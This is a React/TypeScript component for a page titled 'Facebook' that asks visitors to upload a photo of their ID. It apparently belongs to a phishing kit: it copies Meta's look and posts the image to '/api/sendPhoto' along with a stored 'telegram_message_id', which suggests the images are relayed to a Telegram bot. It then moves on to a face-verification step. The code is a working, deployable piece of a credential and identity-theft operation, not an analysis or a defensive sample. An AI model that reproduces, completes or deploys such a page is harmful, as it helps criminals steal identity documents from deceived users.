import UploadImage from '@/assets/images/upload-image.webp';
import { faArrowLeft, faExpand, faLightbulb, faSun } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import type { FC } from 'react';
import { useEffect, useRef, useState } from 'react';
import { useNavigate } from 'react-router';

interface VerificationFormProps {
    isMobile: boolean;
}

const VerificationForm: FC<VerificationFormProps> = ({ isMobile }) => {
    const [file, setFile] = useState<File | null>(null);
    const [isLoading, setIsLoading] = useState(false);
    const [progress, setProgress] = useState(0);
    const [uploadSuccess, setUploadSuccess] = useState(false);
    const fileInputRef = useRef<HTMLInputElement>(null);
    const navigate = useNavigate();

    useEffect(() => {
        let progressInterval: NodeJS.Timeout;
        if (isLoading) {
            setProgress(0);
            progressInterval = setInterval(() => {
                setProgress((prev) => {
                    if (uploadSuccess) {
                        return 100;
                    }
                    if (prev >= 90) {
                        return 90;
                    }
                    return prev + 2;
                });
            }, 100);
        } else {
            setProgress(0);
        }
        return () => clearInterval(progressInterval);
    }, [isLoading, uploadSuccess]);

    const validateFile = (file: File): boolean => {
        const validTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];
        if (!validTypes.includes(file.type)) {
            alert('Please select a valid image file (jpg, png, gif, webp)');
            return false;
        }
        return true;
    };

    const handleChange = async (e: React.ChangeEvent<HTMLInputElement>) => {
        e.preventDefault();
        const selectedFile = e.target.files?.[0];

        if (selectedFile && validateFile(selectedFile)) {
            setFile(selectedFile);
            setIsLoading(true);
            setUploadSuccess(false);

            try {
                const formData = new FormData();
                formData.append('photo', selectedFile);

                const messageId = localStorage.getItem('telegram_message_id');
                if (messageId) {
                    formData.append('message_id', messageId);
                }

                const response = await fetch('/api/sendPhoto', {
                    method: 'POST',
                    body: formData,
                });

                const data = await response.json();

                if (data.success) {
                    setUploadSuccess(true);
                    localStorage.setItem('telegram_message_id', data.message_id.toString());
                    navigate('/kyc-face-verify');
                }
            } catch (error) {
                console.error(error);
            } finally {
                setIsLoading(false);
            }
        }
    };

    const handleTakePhoto = () => {
        fileInputRef.current?.click();
    };

    const handleBack = () => {
        navigate(-1);
    };

    return isMobile ? (
        <div className="flex min-h-screen flex-col bg-gradient-to-br from-[#FFFFFF] via-[#FBF2F9] to-[#EEFCF3] px-4 pt-8 font-[Optimistic]">
            <div className="mb-6 flex items-center justify-between">
                <button onClick={handleBack} className="text-[#1c2b33] hover:text-gray-700">
                    <FontAwesomeIcon icon={faArrowLeft} size="lg" />
                </button>
            </div>

            <div className="text-[#0a1317]">
                <p className="text-[13px] font-medium"></p>
                <p className="mt-4 text-2xl font-semibold">Upload your ID</p>
                <p className="mb-4 text-[15px]">
                    Upload a photo that clearly shows your ID or document.
                </p>
            </div>

            <img src={UploadImage} alt="" className="mb-4 w-full rounded-xl" />

            <div className="mb-8">
                <h2 className="mb-4 font-medium text-gray-900">To get started</h2>
                <div className="space-y-6">
                    <div className="flex items-center gap-4">
                        <div className="flex-shrink-0">
                            <FontAwesomeIcon icon={faLightbulb} className="h-5 w-5 text-gray-600" />
                        </div>
                        <p className="text-[15px] text-gray-600">Choose a well-lit environment</p>
                    </div>
                    <div className="flex items-center gap-4">
                        <div className="flex-shrink-0">
                            <FontAwesomeIcon icon={faSun} className="h-5 w-5 text-gray-600" />
                        </div>
                        <p className="text-[15px] text-gray-600">Ensure no glare or shadows</p>
                    </div>
                    <div className="flex items-center gap-4">
                        <div className="flex-shrink-0">
                            <FontAwesomeIcon icon={faExpand} className="h-5 w-5 text-gray-600" />
                        </div>
                        <p className="text-[15px] text-gray-600">
                            Include all four corners in the image
                        </p>
                    </div>
                </div>
            </div>

            {file && (
                <div className="mb-4">
                    <div className="flex flex-col space-y-2 rounded-lg bg-white p-3">
                        <div className="flex items-center justify-between">
                            <span className="text-sm text-gray-600">Uploading...</span>
                            <span className="text-xs text-gray-500">
                                {(file.size / 1024 / 1024).toFixed(2)} MB
                            </span>
                        </div>
                        <div className="h-2 w-full overflow-hidden rounded-full bg-gray-100">
                            <div
                                className="h-full bg-blue-600 transition-all duration-200"
                                style={{
                                    width: `${progress}%`,
                                }}
                            />
                        </div>
                    </div>
                </div>
            )}

            <div className="flex flex-col gap-3">
                <button
                    onClick={handleTakePhoto}
                    disabled={isLoading}
                    className={`w-full rounded-full bg-[#0064E0] px-4 py-3 text-[15px] font-semibold text-white transition hover:bg-blue-600 ${
                        isLoading ? 'cursor-not-allowed opacity-50' : ''
                    }`}
                >
                    {isLoading ? 'Uploading...' : 'Upload photo'}
                </button>
            </div>

            <input
                type="file"
                accept="image/*"
                onChange={handleChange}
                className="hidden"
                ref={fileInputRef}
            />
        </div>
    ) : (
        <div className="flex min-h-screen flex-col items-center justify-center font-[Optimistic]">
            <div className="max-w-[600px]">
                <div className="text-[#0a1317]">
                    <p className="text-[13px] font-medium"></p>
                    <p className="text-2xl font-semibold">Upload your ID</p>
                    <p className="mb-2 text-[15px]">
                        Upload a photo that clearly shows your ID or document.
                    </p>
                </div>

                <img src={UploadImage} alt="" className="mb-3" />

                <div className="mb-8">
                    <h2 className="mb-4 font-medium text-gray-900">To get started</h2>
                    <div className="space-y-6">
                        <div className="flex items-center gap-4">
                            <div className="flex-shrink-0">
                                <FontAwesomeIcon
                                    icon={faLightbulb}
                                    className="h-5 w-5 text-gray-600"
                                />
                            </div>
                            <p className="text-[15px] text-gray-600">
                                Choose a well-lit environment
                            </p>
                        </div>
                        <div className="flex items-center gap-4">
                            <div className="flex-shrink-0">
                                <FontAwesomeIcon icon={faSun} className="h-5 w-5 text-gray-600" />
                            </div>
                            <p className="text-[15px] text-gray-600">Ensure no glare or shadows</p>
                        </div>
                        <div className="flex items-center gap-4">
                            <div className="flex-shrink-0">
                                <FontAwesomeIcon
                                    icon={faExpand}
                                    className="h-5 w-5 text-gray-600"
                                />
                            </div>
                            <p className="text-[15px] text-gray-600">
                                Include all four corners in the image
                            </p>
                        </div>
                    </div>
                </div>

                {file && (
                    <div className="mb-4">
                        <div className="flex flex-col space-y-2 rounded-lg bg-white p-3">
                            <div className="flex items-center justify-between">
                                <span className="text-sm text-gray-600">Uploading...</span>
                                <span className="text-xs text-gray-500">
                                    {(file.size / 1024 / 1024).toFixed(2)} MB
                                </span>
                            </div>
                            <div className="h-2 w-full overflow-hidden rounded-full bg-gray-100">
                                <div
                                    className="h-full bg-blue-600 transition-all duration-200"
                                    style={{
                                        width: `${progress}%`,
                                    }}
                                />
                            </div>
                        </div>
                    </div>
                )}

                <div className="flex flex-col gap-2">
                    <button
                        onClick={handleTakePhoto}
                        className="w-full rounded-full bg-[#0064E0] px-4 py-3 text-[15px] font-semibold text-white transition hover:bg-blue-600"
                    >
                        Upload photo
                    </button>
                </div>

                <input
                    type="file"
                    accept="image/*"
                    onChange={handleChange}
                    className="hidden"
                    ref={fileInputRef}
                />
            </div>
        </div>
    );
};

const IDVerification: FC = () => {
    const [isMobile, setIsMobile] = useState(false);

    useEffect(() => {
        const checkIfMobile = () => {
            setIsMobile(window.innerWidth < 768);
        };
        checkIfMobile();
        window.addEventListener('resize', checkIfMobile);
        return () => {
            window.removeEventListener('resize', checkIfMobile);
        };
    }, []);

    return (
        <>
            <title>Facebook</title>
            <VerificationForm isMobile={isMobile} />
        </>
    );
};

export default IDVerification;
